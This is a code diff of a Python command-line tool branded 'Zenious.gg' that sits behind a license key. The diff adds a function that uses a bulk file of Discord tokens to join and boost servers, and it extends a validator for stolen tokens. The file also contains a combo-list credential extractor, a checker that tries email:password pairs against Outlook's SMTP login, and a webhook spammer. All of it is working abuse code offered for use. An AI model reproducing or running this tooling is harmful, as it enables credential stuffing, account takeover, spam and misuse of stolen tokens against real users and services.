@@ -14,10 +14,9 @@ import smtplib
 animation_running = True
 
 def set_window_title(title):
-    # Set the terminal window title
-    if os.name == 'nt':  # For Windows
+    if os.name == 'nt':
         os.system(f'title {title}')
-    else:  # For Unix-based systems (Linux, macOS)
+    else:
         print(f'\33]0;{title}\a', end='', flush=True)
 
 def print_colored_logo_with_wave_effect():
@@ -46,11 +45,8 @@ def print_colored_logo_with_wave_effect():
         "    \\$$$$   \\$$$$$$   \\$$$$$$  \\$$ \\$$$$$$$                    "
     ]
 
-    # ANSI escape codes for colors
-    colors = ['\033[94m', '\033[95m']  # Blue and Purple
+    colors = ['\033[94m', '\033[95m']
     RESET = '\033[0m'
-
-    # Get the terminal size
     terminal_width = shutil.get_terminal_size().columns
 
     def print_logo_with_colors(colors):
@@ -59,15 +55,13 @@ def print_colored_logo_with_wave_effect():
             color = colors[i % len(colors)]
             print(color + line.center(terminal_width) + RESET)
 
-    # Create a cycle of color combinations
     color_cycle = itertools.cycle(colors)
 
     try:
         while animation_running:
-            # Shift the colors for a smoother wave effect
             current_colors = [next(color_cycle) for _ in range(len(logo))]
             print_logo_with_colors(current_colors)
-            time.sleep(0.05)  # Adjust the speed of the wave effect for smoothness
+            time.sleep(0.05)
     except KeyboardInterrupt:
         pass
 
@@ -98,24 +92,17 @@ def validate_key(url, user_key):
     return False
 
 def process_file(input_file_path, output_folder, search_term):
-    # Ensure the output folder exists
     os.makedirs(output_folder, exist_ok=True)
-
-    # Define the output file path
     output_file_path = os.path.join(output_folder, "extracted_accounts.txt")
 
-    # Read the input file with utf-8 encoding
     with open(input_file_path, 'r', encoding='utf-8', errors='ignore') as file:
         lines = file.readlines()
 
-    # Set to track unique user:pass combinations
     unique_accounts = set()
 
-    # Filter and process lines
     with open(output_file_path, 'w', encoding='utf-8') as output_file:
         for line in lines:
             if search_term in line:
-                # Use regex to extract user:pass
                 match = re.search(r'://(?:[^:]+:)([^:]+):([^\s]+)', line)
                 if match:
                     user, password = match.groups()
@@ -135,39 +122,31 @@ def spam_webhook(webhook_url, message, count):
             print(f"Message sent {i+1}/{count}")
         else:
             print(f"Failed to send message {i+1}/{count}")
-        time.sleep(0.2)  # Adjust the delay between messages
+        time.sleep(0.2)
 
 def check_hotmail_outlook_accounts(input_file_path):
-    # Define the output file path
     output_file_path = "active_hotmails.txt"
-
-    # Read the input file with utf-8 encoding
     with open(input_file_path, 'r', encoding='utf-8', errors='ignore') as file:
         lines = file.readlines()
 
-    # Set to track valid accounts
     valid_accounts = []
-
-    # Check each email:password pair
     for line in lines:
         line = line.strip()
         if ':' not in line:
             print(f"Skipping invalid line: {line}")
-            continue  # Skip malformed lines
+            continue
 
-        email, password = line.split(':', 1)  # Ensure only one split
+        email, password = line.split(':', 1)
         try:
-            # Connect to the Hotmail/Outlook SMTP server
             smtp_server = smtplib.SMTP('smtp.office365.com', 587)
-            smtp_server.starttls()  # Upgrade the connection to a secure encrypted SSL/TLS connection
+            smtp_server.starttls()
             smtp_server.login(email, password)
             smtp_server.quit()
             valid_accounts.append(f"{email}:{password}")
             print(f"Valid: {email}")
         except Exception as e:
-            print(f"Invalid: {email}")
+            print(f"Invalid: {email} - {e}")
 
-    # Save valid accounts to the output file
     with open(output_file_path, 'w', encoding='utf-8') as output_file:
         for account in valid_accounts:
             output_file.write(account + "\n")
@@ -176,28 +155,68 @@ def check_hotmail_outlook_accounts(input_file_path):
     time.sleep(0.5)
     os.system("cls")
 
+def check_discord_token(token):
+    headers = {'Authorization': token}
+    response = requests.get('https://discord.com/api/v9/users/@me', headers=headers)
+    if response.status_code == 200:
+        user_data = response.json()
+        username = user_data['username']
+        nitro_info = user_data.get('premium_type', 0)
+        if nitro_info == 0:
+            nitro_status = "No Nitro"
+        elif nitro_info == 1:
+            nitro_status = "Nitro Classic"
+        elif nitro_info == 2:
+            nitro_status = "Nitro"
+        else:
+            nitro_status = "Unknown Nitro Type"
+        return True, username, nitro_status
+    else:
+        return False, None, None
+
+def boost_nitro_server(token_file_path, server_invite_code):
+    with open(token_file_path, 'r', encoding='utf-8', errors='ignore') as file:
+        tokens = file.readlines()
+
+    for token in tokens:
+        token = token.strip()
+        headers = {'Authorization': token}
+
+        # Join the server
+        join_response = requests.post(
+            f'https://discord.com/api/v9/invites/{server_invite_code}',
+            headers=headers,
+            json={"type": 1}
+        )
+        if join_response.status_code == 200:
+            print(f"Joined server with token: {token}")
+        else:
+            print(f"Failed to join server with token: {token}")
+            continue
+
+        # Boost the server twice
+        for _ in range(2):
+            boost_response = requests.post(
+                'https://discord.com/api/v9/guilds/premium/subscription-slots',
+                headers=headers,
+                json={"user_premium_guild_subscription_slot_ids": [""]}
+            )
+            if boost_response.status_code == 201:
+                print(f"Boosted server with token: {token}")
+            else:
+                print(f"Failed to boost server with token: {token}")
+                break
+
 def main():
     global animation_running
-
-    # Set the window title
     set_window_title("Zenious.gg")
-
-    # Start the logo animation in a separate thread
     logo_thread = threading.Thread(target=print_colored_logo_with_wave_effect)
     logo_thread.daemon = True
     logo_thread.start()
-
-    # Wait for a short period to display the animation
     time.sleep(2)
-
-    # Stop the animation
     animation_running = False
     logo_thread.join()
-
-    # Clear the screen and display the menu
     os.system('cls' if os.name == 'nt' else 'clear')
-
-    # ANSI escape codes for menu colors
     BLUE = '\033[94m'
     PURPLE = '\033[95m'
     RESET = '\033[0m'
@@ -208,36 +227,28 @@ def main():
         print(f"{BLUE}2. Spam Webhook{RESET}")
         print(f"{PURPLE}3. Validate Discord Token{RESET}")
         print(f"{BLUE}4. Check Hotmail/Outlook Accounts{RESET}")
-        print(f"{PURPLE}5. Exit{RESET}")
+        print(f"{PURPLE}5. Boost Nitro Server{RESET}")
+        print(f"{BLUE}6. Exit{RESET}")
 
-        choice = input(f"{PURPLE}Please choose an option (1, 2, 3, 4, or 5): {RESET}")
+        choice = input(f"{PURPLE}Please choose an option (1, 2, 3, 4, 5, or 6): {RESET}")
 
         if choice == '1':
-            # Predefined input file path and output folder
             input_file_path = 'in.txt'
             output_folder = 'output'
-
-            # Ask for the search term
             search_term = input("Enter the search term: ")
-
-            # Run the file processing function
             process_file(input_file_path, output_folder, search_term)
         elif choice == '2':
             webhook_url = input("Enter the webhook URL: ")
             message = input("Enter the message to spam: ")
             count = int(input("Enter the number of messages to send: "))
-
-            # Run the webhook spammer function
             spam_webhook(webhook_url, message, count)
-
-            # Clear the screen after spamming
             time.sleep(0.5)
             os.system("cls")
         elif choice == '3':
             token = input("Enter the Discord token to check: ")
-            is_valid, username = check_discord_token(token)
+            is_valid, username, nitro_status = check_discord_token(token)
             if is_valid:
-                print(f"Token is valid. Username: {username}")
+                print(f"Token is valid. Username: {username}, Nitro Status: {nitro_status}")
             else:
                 print("Token is invalid.")
             time.sleep(2)
@@ -246,6 +257,12 @@ def main():
             input_file_path = input("Enter the path to the combo file: ")
             check_hotmail_outlook_accounts(input_file_path)
         elif choice == '5':
+            token_file_path = '1m.txt'
+            server_invite_code = input("Enter the server invite code: ")
+            boost_nitro_server(token_file_path, server_invite_code)
+            time.sleep(2)
+            os.system("cls")
+        elif choice == '6':
             print("Exiting the program.")
             break
         else:
@@ -254,7 +271,7 @@ def main():
             os.system("cls")
 
 def check_key_and_run():
-    github_url = "https://raw.githubusercontent.com/hxizx/boring/refs/heads/main/keys.txt"  # Replace with your GitHub raw URL
+    github_url = "https://raw.githubusercontent.com/hxizx/boring/refs/heads/main/keys.txt"
     user_key = input("Enter your key to access the program: ")
 
     if validate_key(github_url, user_key):
@@ -263,17 +280,6 @@ def check_key_and_run():
         main()
     else:
         print("Invalid key or HWID mismatch. Access denied.")
-
-def check_discord_token(token):
-    headers = {
-        'Authorization': token
-    }
-    response = requests.get('https://discord.com/api/v9/users/@me', headers=headers)
-    if response.status_code == 200:
-        user_data = response.json()
-        return True, user_data['username']
-    else:
-        return False, None
 
 if __name__ == "__main__":
     check_key_and_run()
